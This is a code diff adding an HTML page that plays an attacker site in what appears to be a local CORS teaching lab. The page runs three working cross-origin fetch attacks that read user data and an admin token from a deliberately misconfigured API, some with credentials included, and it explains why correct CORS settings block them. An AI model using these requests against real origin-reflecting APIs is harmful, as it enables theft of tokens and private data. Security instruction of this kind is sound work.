@@ -2,10 +2,328 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>evil.local</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>evil.local - CORS Attack Demo</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      max-width: 860px;
+      margin: 40px auto;
+      padding: 0 24px 60px;
+      color: #1a1a1a;
+      background: #fafafa;
+    }
+
+    .site-label {
+      display: inline-block;
+      font-size: .75rem;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      padding: 3px 10px;
+      border-radius: 999px;
+      background: #fee2e2;
+      color: #991b1b;
+      margin-bottom: 12px;
+    }
+
+    h1 { font-size: 1.8rem; margin: 8px 0 4px; }
+    h2 { font-size: 1.05rem; margin: 0 0 10px; }
+
+    .banner {
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: .9rem;
+      font-weight: 500;
+      margin: 20px 0 32px;
+    }
+    .banner.unknown   { background: #f3f4f6; color: #555; }
+    .banner.disabled  { background: #f3f4f6; color: #374151; }
+    .banner.enabled   { background: #f3f4f6; color: #374151; }
+    .banner.misconfig { background: #fee2e2; color: #991b1b; }
+
+    details.explainer {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 4px 24px 20px;
+      margin-bottom: 36px;
+      font-size: .9rem;
+      line-height: 1.65;
+    }
+    details.explainer summary {
+      cursor: pointer;
+      font-weight: 600;
+      font-size: .95rem;
+      color: #b91c1c;
+      padding: 16px 0 4px;
+      user-select: none;
+    }
+    details.explainer p { margin: 10px 0 0; }
+    details.explainer code {
+      background: #e2e8f0;
+      padding: 1px 5px;
+      border-radius: 4px;
+      font-size: .85rem;
+    }
+
+    .demo-card {
+      background: #fff;
+      border: 1px solid #e5e7eb;
+      border-radius: 10px;
+      padding: 24px;
+      margin-bottom: 20px;
+    }
+
+    .badge {
+      display: inline-block;
+      font-size: .7rem;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      padding: 2px 9px;
+      border-radius: 999px;
+      margin-bottom: 12px;
+    }
+    .badge-1 { background: #fef9c3; color: #854d0e; }
+    .badge-2 { background: #fce7f3; color: #9d174d; }
+    .badge-3 { background: #fee2e2; color: #991b1b; }
+
+    .meta {
+      font-size: .88rem;
+      color: #444;
+      margin-bottom: 16px;
+      line-height: 1.6;
+    }
+    .meta code {
+      background: #f3f4f6;
+      padding: 1px 5px;
+      border-radius: 4px;
+      font-size: .84rem;
+    }
+
+    button {
+      padding: 7px 20px;
+      font-size: .9rem;
+      border: none;
+      border-radius: 6px;
+      background: #b91c1c;
+      color: #fff;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    button:hover { background: #991b1b; }
+    button:disabled { background: #fca5a5; cursor: default; }
+
+    .result {
+      display: none;
+      margin-top: 14px;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-left: 4px solid #cbd5e1;
+      border-radius: 0 6px 6px 0;
+      padding: 14px 16px;
+      font-family: 'Menlo', 'Consolas', monospace;
+      font-size: .82rem;
+      line-height: 1.7;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .result.visible { display: block; }
+    .result.success { border-left-color: #ef4444; }
+    .result.blocked { border-left-color: #22c55e; }
+
+    .hint { font-size: .8rem; color: #6b7280; margin-top: 10px; }
+  </style>
 </head>
 <body>
-  <h1>evil.local</h1>
-  <p>Attack demo — implementation in progress.</p>
+
+  <span class="site-label">evil.local:8082</span>
+  <h1>CORS Attack Demo</h1>
+  <p style="color:#555;font-size:.9rem;margin-bottom:0">
+    This page simulates an attacker's site attempting to steal data from
+    <code style="background:#f3f4f6;padding:1px 5px;border-radius:4px;font-size:.84rem">api.local:8081</code>
+    using cross-origin requests from a different origin.
+  </p>
+
+  <div id="banner" class="banner unknown">Checking API CORS mode...</div>
+
+  <details class="explainer" open>
+    <summary>What this demonstrates</summary>
+    <p>
+      When a server is <strong>correctly configured</strong> (CORS disabled or
+      whitelisting only <code>frontend.local:8080</code>), requests from
+      <code>evil.local:8082</code> are blocked by the browser - the attacker
+      cannot read any data even though the HTTP request may have reached the server.
+    </p>
+    <p>
+      When a server is <strong>misconfigured</strong> (<code>CORS_MISCONFIG=1</code>),
+      it blindly reflects the requesting <code>Origin</code> header back as
+      <code>Access-Control-Allow-Origin</code> and sets
+      <code>Access-Control-Allow-Credentials: true</code>. The browser then permits
+      <code>evil.local</code> to read the full response, including sensitive endpoints.
+    </p>
+    <p>
+      Note: using <code>Access-Control-Allow-Origin: *</code> combined with credentials
+      would be rejected by browsers outright. Reflecting the specific origin is the
+      real-world pattern that actually works as an attack vector.
+    </p>
+  </details>
+
+  <!-- Attack 1 -->
+  <div class="demo-card">
+    <span class="badge badge-1">Attack 1 - Public data</span>
+    <h2>Steal GET /api/data</h2>
+    <p class="meta">
+      Fetches <code>http://api.local:8081/api/data</code> from <code>evil.local:8082</code>.
+      With correct CORS the browser blocks the read. With CORS_MISCONFIG=1 the full
+      user list is returned to this page.
+    </p>
+    <button onclick="runAttack1(this)">Run attack</button>
+    <pre id="result-1" class="result"></pre>
+  </div>
+
+  <!-- Attack 2 -->
+  <div class="demo-card">
+    <span class="badge badge-2">Attack 2 - Private credentials</span>
+    <h2>Steal GET /api/private</h2>
+    <p class="meta">
+      Fetches the private endpoint <code>http://api.local:8081/api/private</code>.
+      This endpoint returns an admin token. With CORS_MISCONFIG=1 evil.local
+      can read it in full.
+    </p>
+    <button onclick="runAttack2(this)">Run attack</button>
+    <pre id="result-2" class="result"></pre>
+  </div>
+
+  <!-- Attack 3 -->
+  <div class="demo-card">
+    <span class="badge badge-3">Attack 3 - Credentialed request</span>
+    <h2>Steal GET /api/private with credentials: include</h2>
+    <p class="meta">
+      Same as Attack 2 but with <code>credentials: 'include'</code>, which instructs
+      the browser to send any cookies or auth headers along with the request.
+      This requires both <code>Access-Control-Allow-Origin</code> to be the exact
+      requesting origin (not <code>*</code>) and
+      <code>Access-Control-Allow-Credentials: true</code> in the response.
+      The CORS misconfig satisfies both conditions.
+    </p>
+    <button onclick="runAttack3(this)">Run attack</button>
+    <pre id="result-3" class="result"></pre>
+    <p class="hint">DevTools -&gt; Network (F12): observe the Origin and
+      Access-Control-Allow-Origin headers on the response.</p>
+  </div>
+
+  <script>
+    const API = 'http://api.local:8081';
+
+    // Banner: fetching cors-config from evil.local is itself cross-origin.
+    // It only succeeds when the API reflects evil.local as an allowed origin.
+    (async () => {
+      const el = document.getElementById('banner');
+      try {
+        const { cors } = await fetch(`${API}/api/cors-config`).then(r => r.json());
+        const states = {
+          disabled:  ['disabled',  'CORS disabled - requests from evil.local will be blocked'],
+          enabled:   ['enabled',   'CORS enabled for frontend.local only - evil.local is still blocked'],
+          misconfig: ['misconfig', 'CORS misconfigured - api.local reflects any origin, attacks will succeed'],
+        };
+        const [cls, text] = states[cors] ?? ['unknown', `cors: ${cors}`];
+        el.className = `banner ${cls}`;
+        el.textContent = text;
+      } catch {
+        el.className = 'banner disabled';
+        el.textContent = 'CORS disabled or frontend.local-only - this status fetch was blocked (see DevTools)';
+      }
+    })();
+
+    function show(id, stolen, text) {
+      const el = document.getElementById(id);
+      el.className = `result visible ${stolen ? 'success' : 'blocked'}`;
+      el.textContent = text;
+    }
+
+    async function runAttack1(btn) {
+      btn.disabled = true;
+      const url = `${API}/api/data`;
+      try {
+        const r    = await fetch(url);
+        const body = await r.json();
+        show('result-1', true,
+          '[DATA STOLEN]\n' +
+          `  URL    : ${url}\n` +
+          `  Status : ${r.status}\n` +
+          `  Body   : ${JSON.stringify(body, null, 2)}`
+        );
+      } catch (e) {
+        show('result-1', false,
+          '[BLOCKED] Browser enforced CORS policy\n' +
+          `  URL      : ${url}\n` +
+          `  JS error : ${e.message}\n\n` +
+          '  evil.local cannot read this response.'
+        );
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    async function runAttack2(btn) {
+      btn.disabled = true;
+      const url = `${API}/api/private`;
+      try {
+        const r    = await fetch(url);
+        const body = await r.json();
+        show('result-2', true,
+          '[CREDENTIALS STOLEN]\n' +
+          `  URL    : ${url}\n` +
+          `  Status : ${r.status}\n` +
+          `  Body   : ${JSON.stringify(body, null, 2)}`
+        );
+      } catch (e) {
+        show('result-2', false,
+          '[BLOCKED] Browser enforced CORS policy\n' +
+          `  URL      : ${url}\n` +
+          `  JS error : ${e.message}\n\n` +
+          '  evil.local cannot read this response.'
+        );
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    async function runAttack3(btn) {
+      btn.disabled = true;
+      const url = `${API}/api/private`;
+      try {
+        const r    = await fetch(url, { credentials: 'include' });
+        const body = await r.json();
+        show('result-3', true,
+          '[CREDENTIALED THEFT]\n' +
+          `  URL         : ${url}\n` +
+          '  Credentials : include (cookies and auth headers sent)\n' +
+          `  Status      : ${r.status}\n` +
+          `  Body        : ${JSON.stringify(body, null, 2)}\n\n` +
+          '  Access-Control-Allow-Origin matched the requesting origin.\n' +
+          '  Access-Control-Allow-Credentials: true was present.\n' +
+          '  The browser permitted evil.local to read the credentialed response.'
+        );
+      } catch (e) {
+        show('result-3', false,
+          '[BLOCKED] Browser enforced CORS policy\n' +
+          `  URL         : ${url}\n` +
+          '  Credentials : include\n' +
+          `  JS error    : ${e.message}\n\n` +
+          '  For credentialed requests the browser requires the response to carry\n' +
+          '  Access-Control-Allow-Origin set to the exact requesting origin (not *)\n' +
+          '  and Access-Control-Allow-Credentials: true. Neither condition was met.'
+        );
+      } finally {
+        btn.disabled = false;
+      }
+    }
+  </script>
+
 </body>
 </html>
